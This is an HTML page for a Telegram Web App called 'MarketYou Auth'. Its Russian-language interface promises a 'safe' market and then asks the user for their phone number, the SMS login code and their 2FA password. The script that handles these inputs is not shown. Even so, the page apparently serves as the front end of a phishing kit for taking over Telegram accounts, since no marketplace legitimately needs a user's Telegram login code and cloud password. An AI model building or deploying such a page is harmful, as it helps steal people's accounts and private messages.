<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MarketYou Auth</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>😉 Наш маркет - безопасен! Войдите для продолжения.</h1>
        </header>
        <button id="loginBtn" class="login-btn">Войти</button>
        <div id="authForm" class="auth-form hidden">
            <input id="phoneInput" type="text" class="input-field hidden" readonly>
            <input id="codeInput" type="text" class="input-field hidden" placeholder="Введите SMS-код">
            <input id="twoFaInput" type="password" class="input-field hidden" placeholder="Введите пароль 2FA">
            <div id="loadingSpinner" class="loading hidden"></div>
            <div id="successMsg" class="success hidden">✅ Авторизация успешна! Закройте приложение.</div>
            <div id="errorMsg" class="error hidden"></div>
            <div id="statusMsg" class="status-msg"></div>
            <div id="instructionMsg" class="status-msg hidden">Проверьте сообщение от бота ниже. Если требуется 2FA, введите пароль и подтвердите. Иначе закройте приложение.</div>
            <button id="submitBtn" class="submit-btn hidden">Отправить</button>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
